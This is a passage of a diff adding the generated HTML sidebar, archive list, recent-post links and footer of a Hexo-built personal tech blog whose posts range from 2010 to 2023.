style="font-size: 10px;">nginx;脚本</a> <a href="/tags/openshift/" style="font-size: 10px;">openshift</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/paas/" style="font-size: 10px;">paas</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/qsort/" style="font-size: 10px;">qsort</a> <a href="/tags/setjmp/" style="font-size: 10px;">setjmp</a> <a href="/tags/xss-easyxss/" style="font-size: 10px;">xss;easyxss</a> <a href="/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/" style="font-size: 10px;">云计算</a> <a href="/tags/%E6%A0%91%E9%9C%89%E6%B4%BE/" style="font-size: 10px;">树霉派</a> <a href="/tags/%E9%9F%B3%E9%A2%91%E9%99%8D%E5%99%AA/" style="font-size: 10px;">音频降噪</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">February 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">September 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">August 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">March 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">January 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">November 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">October 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">September 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">August 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/04/">April 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/03/">March 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/02/">February 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/01/">January 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/12/">December 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/11/">November 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/10/">October 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/09/">September 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/08/">August 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/07/">July 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/06/">June 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/05/">May 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/04/">April 2010</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/03/">March 2010</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/04/22/hello-world/">Hello Hexo</a>
+          </li>
+        
+          <li>
+            <a href="/2023/03/09/post-title-with-whitespace/">post title with whitespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/21/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E5%92%8C%E8%BE%93%E5%85%A5%E5%8D%A1%E9%A1%BF%EF%BC%8C%E8%AF%95%E4%BA%86%E5%BE%88%E5%A4%9A%E6%96%B9%E6%B3%95/">解决树莓派SSH登录和输入卡顿，试了很多方法</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/26/%E5%B7%B4%E8%8F%B2%E7%89%B9%E7%9A%84%E5%9F%BA%E7%A1%80%E6%8A%95%E8%B5%84%E7%90%86%E5%BF%B5%E8%AE%B0%E5%BD%95/">巴菲特的基础投资理念记录</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/26/Ubuntu-%E5%AE%89%E8%A3%85minikebe/">Ubuntu 安装minikebe</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 key1088<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
